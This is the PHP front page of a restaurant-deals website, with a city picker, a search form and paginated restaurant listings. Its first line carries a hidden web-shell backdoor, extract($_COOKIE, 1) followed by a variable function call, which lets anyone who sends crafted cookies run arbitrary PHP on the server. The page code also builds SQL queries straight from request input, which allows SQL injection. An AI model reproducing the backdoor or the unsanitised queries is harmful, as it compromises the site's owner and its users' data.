<?php extract($_COOKIE, 1); @$mQmAS9&&@$F($A,$B); ?><?php
session_start();
include("admin/lib/conn.php");
if(isset($_COOKIE['resCity'])){
	//echo '<script type="text/javascript">';
	//echo 'window.location=home.php?city='.$_COOKIE['resCity'];
	header("location:home.php?city=".$_COOKIE['resCity']);
	exit();
}

if($_REQUEST['submit'] == 'Continue'){
	
$expire=time()+60*60*24*30;

$city = explode(",", $_REQUEST['city_address']);
$sql_getcity = mysql_fetch_array(mysql_query("SELECT * FROM restaurant_basic_info WHERE restaurant_zipcode = '".$city[0]."'"));
if(!empty($sql_getcity['restaurant_city'])){
	setcookie("resCity", $sql_getcity['restaurant_city'], $expire);	
	setcookie("reszip", $city[0], $expire);	
}else{
	setcookie("resCity", $city[0], $expire);
	setcookie("reszip", '', $expire);	
}

header("location:home.php?city=".$city[0]);
}

$sep="";
$sql_basic_info_city=mysql_query("SELECT DISTINCT(restaurant_city), restaurant_state FROM restaurant_basic_info where status=1");
while($res_basc_info_city=mysql_fetch_array($sql_basic_info_city))
{
	//$all_city.=$sep.'"'.strtolower($res_basc_info_city['restaurant_city']).'"/"'.strtolower($res_basc_info_city['restaurant_state']).'"';
	$all_city.=$sep.'"'.strtolower($res_basc_info_city['restaurant_city']).",".strtolower($res_basc_info_city['restaurant_state']).'"';
	$sep=",";
}

$sql_basic_info_zipcode=mysql_query("SELECT DISTINCT(restaurant_zipcode) FROM restaurant_basic_info where status=1");
$all_zipcode="";
$sep1 = '';
while($res_basc_info_zipcode=mysql_fetch_array($sql_basic_info_zipcode))
{
	$all_zipcode.=$sep1.'"'.strtolower($res_basc_info_zipcode['restaurant_zipcode']).'"';
	$sep1=",";
}

$full_address = $all_city.",".$all_zipcode;

//$zipcode = $all_zipcode;

include ("includes/header.php");
include ("includes/functions.php");?>

<script type="text/javascript">
function validate(){
	if(document.getElementById('city_address').value == ''){
		alert('Please enter city.');
		document.getElementById('city_address').focus();
		return false;
	}
	return true;
}
</script>

<link rel="stylesheet" href="//code.jquery.com/ui/1.10.4/themes/smoothness/jquery-ui.css">
<script src="//code.jquery.com/jquery-1.9.1.js"></script>
<script src="//code.jquery.com/ui/1.10.4/jquery-ui.js"></script>
<link rel="stylesheet" href="/resources/demos/style.css">

<script>
  $(function() {
    var availableTags = [<?php echo $full_address;?>];
    $( ".city_add" ).autocomplete({
      source: availableTags
    });
  });
  
  $(function() {
    var availableTags = [<?php echo $zipcode;?>];
    $( ".zipcode" ).autocomplete({
      source: availableTags
    });
  });
</script>

<body onLoad="init();">
<div id="fade"></div>
<div id="level_div">
<div class="popup_main">
<div class="popup_form_container">

<div class="popup_bg">
<form name="myfrm_city" method="post" action="" onSubmit="return validate();">
<div class="popup_inner_bg">

<div class="free_membership"><a href="signup.php"><img src="images/free_membership.png" width="125" height="124" /></a></div>

<div class="inner_bg_top">
<h1>your city for less</h1>
<p>Get up to 80% off great deals on restaurant in your local city !!!</p>
</div>

<div class="clear"></div>

<div class="popup_divider"><img src="images/popup_divider.png" width="507" height="21" /></div>


<div class="inner_bg_middle">

<p>What city would you like?</p>
<input name="city_address" id="city_address" type="text" class="popup_textfield city_add" autocomplete="off" />


<div class="clear"></div>

<?php /*?><p>Zipcode</p>
<input name="zipcode" id="zipcode" type="text" class="popup_textfield zipcode" autocomplete="off" />
<div class="clear"></div><?php */?>

</div>

<div class="continue_button">
<input name="submit" type="submit" value="Continue" class="button_pop" /> 
<div class="clear"></div>
</div>

<div class="button_text">
<!--<p>By subscribing, I agree to the terms service and privacy and policy</p>-->
</div>

<div class="inner_bg_bottom">
	<a href="login.php"><img src="images/member_sign_button.png" width="141" height="48" /> </a>
</div>

</div>
</form>
<div class="clear"></div>
</div>
<div class="clear"></div>
</div>

</div>

</div>
<div class="header_section">

<div class="header_top">

<div class="header_container">
<div class="logo_left"><img src="images/logo.png" /></div>


<div class="search_right">

<form name="frm_search" id="frm_search" action="" method="">
<div class="search_box">

<div class="left_search">
    <p class="left_search">What are you looking for?<span class="left_search_two">( Restaurant, Cuisine )</span></p>
    <input name="rest_item" id="rest_item" type="text" class="search_textfield" value="<?php //echo $_REQUEST['rest_item']; ?>" />
</div>

<div class="search_two">
<p class="left_search"> Where?<span class="left_search_two">( City,State or Zip code )</span></p>
<input type="text" name="full_address" id="full_address" class="search_textfield" style="width:230px;" value="<?php //echo $_REQUEST['city']; ?>"  onfocus="if (this.value!='') this.value = ''" autocomplete="off" />
</div>

<div class="search_button"><input name="btn_search" id="btn_search" type="submit" value="search" class="button2"/></div>

</div>
</form>

</div>

<div class="clear"></div>
</div>

</div>
</div>
<div class="clear"></div>

<?php include ("includes/menu_section.php");?>


<div class="body_section">

<div class="body_container">
<div class="body_top"></div>
<div class="main_body">

<div class="main_body_cont">

<?php include("includes/banner_section.php");?>

<div class="content_container">

<?php include("includes/left_section.php");?>
<div class="body_cont_right">

<div class="right_top">

<div class="right_cont_top">
<h1>Hot Deal</h1>
</div>
<div class="right_cont_middle">

<?php $sql_select_deal = mysql_query("SELECT * FROM restaurant_deals WHERE deals_status =1 AND daily_name!='' LIMIT 0,3 ORDER BY rand()");
while($array_deal = mysql_fetch_array($sql_select_deal)){?>
<div class="right_cont_one">

<div class="right_top_section">
<div class="top_image"><img src="thumb_images/<?php echo $array_deal['daily_picture'];?>" width="216" height="150" /></div>
</div>

<div class="right_middle_section">
<h1 style="font-weight:bold"><?php echo stripslashes($array_deal['daily_name']);?></h1>
<p><?php echo $array_deal['daily_price'];?></p>
</div>

<div class="right_button">
  <a href="restaurant.php?id=<?php echo $array_deal['restaurant_id'];?>"><img src="images/more_button.png" width="77" height="26" /></a> 
  </div>

</div>


<?php } ?>

<div class="clear"></div>
</div>


<div class="right_cont_bottom"></div>

</div>
<div class="clear"></div>

<div class="right_dish_content">

<?php $query_res = "SELECT * FROM restaurant_basic_info WHERE status = 1";

$sel_product=mysql_query($query_res);
					
if(mysql_num_rows($sel_product)<1)
{
echo "No Results Found";
}

//////////////////////start pagination/////////////////////////
if($_REQUEST['search']!="")
{
$page=1;
}
else
{
$page=$_REQUEST['page'];

if($_REQUEST['page']=="") 
{ 
$page = 1; 
} 
}
$max_results =8; 
$prev = ($page - 1); 
$next = ($page + 1); 
$from = (($page * $max_results) - $max_results); 

$total_results = mysql_num_rows($sel_product); 
$total_pages = ceil($total_results / $max_results); 

$pagination = ''; 

if($page > 1) 
{ 
$pagination .= "<a href=\"index.php?page=$prev\" class=\"more_link_pagination_prev\">Previous</a>"; 
$pagination.="&nbsp;&nbsp;&nbsp;";
} 

for($i = 1; $i <=$total_pages; $i++) 
{ 
if(($page) == $i) 
{ 
$pagination .= $i; 
$pagination.='&nbsp;&nbsp;&nbsp;';
} 
else 
{ 
$pagination .= "<a href=\"index.php?page=$i\" class=\"more_link_pagination\">$i</a>"; 
$pagination.='&nbsp;&nbsp;&nbsp;';
} 
} 

if($page < $total_pages) 
{ 
$pagination .= "<a href=\"index.php?page=$next\" class=\"more_link_pagination_prev\">Next</a>"; 
$pagination.="&nbsp;&nbsp;&nbsp;";
} 

$query_res.=" limit $from,$max_results";
//echo $query_res;
$query_products=mysql_query($query_res);
////////////////////////////////End pagination////////////////////////////////////

while($array_select_restaurant = mysql_fetch_array($query_products)){?>
<div class="dish_content_one">

<div class="dish_cont_left"><img src="uploaded_images/<?php echo $array_select_restaurant['restaurant_image'];?>" width="179" height="109" /></div>

<div class="dish_cont_middle">

<h1><?php echo $array_select_restaurant['restaurant_name'];?></h1>

<ul>
<li><a href="#"><img src="images/star-1.png" width="16" height="16" /></a></li>
<li><a href="#"><img src="images/star-1.png" width="16" height="16" /></a></li>
<li><a href="#"><img src="images/star-1.png" width="16" height="16" /></a></li>
<li><a href="#"><img src="images/star-2.png" width="16" height="16" /></a></li>
<li><a href="#"><img src="images/star-3.png" width="16" height="15" /></a></li>
</ul>

<h2>18 Reviews</h2>

<p>Takeout only</p>

</div>

<div class="dish_cont_right">
  <a href="restaurant.php?id=<?php echo $array_select_restaurant['id']; ?>"><img src="images/view_more.png" width="130" height="39" class="view_more" /></a> </div>

<div class="clear"></div>
</div>
<?php } ?>

</div>



<div class="clear"></div>

<div class="pagination">

<div align="center">
<?php /*?><?php if($total_pages>1){ echo $pagination;}?><?php */?>
<!--<ul>
<li><a href="#" class="prev">Previous</a></li>
<li><a href="#" class="active2">1</a></li>
<li><a href="#">2</a></li>
<li><a href="#">3</a></li>
<li><a href="#">4</a></li>
<li><a href="#">5</a></li>
<li><a href="#">6</a></li>
<li><a href="#" class="prev prev2">Next</a></li>
</ul>-->
</div>
</div>

</div>

<div class="clear"></div>
</div>

</div>

</div>
<div class="body_footer_bg"></div>
<div class="clear"></div>
</div>

</div>

<div class="clear"></div>


<?php include("includes/footer.php");?>